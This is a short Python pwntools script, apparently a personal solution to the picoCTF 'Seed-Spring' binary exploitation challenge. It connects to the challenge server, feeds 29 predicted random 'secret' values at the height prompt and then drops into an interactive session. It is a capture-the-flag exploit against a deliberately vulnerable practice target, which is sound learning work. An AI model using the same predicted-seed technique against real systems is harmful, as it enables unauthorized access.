import struct
import sys
from pwn import *

#####################################################change directory#################################3
level = "Seed-Spring"
ip = "jupiter.challenges.picoctf.org:35856"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

########################################operation mode#########################################
args.DEBUG = False
args.REMOTE = True
#####################################setup solution################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/seed_spring")
#######################################start process#############################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, gdbscript="break *0x400947\nc\nx/24wx 0x601058\n")
    else:
        return process([binary.path])
r = conn()
################################getting input###################################################
arg = sys.argv[1]
value = [int(x) for x in arg.split()]

print("Secret value received: ", value)
for i in range(29):
    r.sendlineafter("height:", value[i])
r.interactive()